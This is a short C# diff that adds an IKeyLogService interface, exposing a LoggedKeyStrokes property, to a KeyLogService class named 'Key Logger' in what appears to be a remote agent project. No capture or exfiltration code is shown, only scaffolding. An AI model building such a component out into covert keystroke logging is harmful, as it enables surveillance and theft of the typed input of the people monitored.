@@ -12,6 +12,10 @@ using System.Threading.Tasks;
 
 namespace Agent.Service
 {
+    public interface IKeyLogService : IRunningService
+    {
+        string LoggedKeyStrokes { get; }
+    }
     public class KeyLogService : RunningService, IKeyLogService
     {
         public override string ServiceName => "Key Logger";
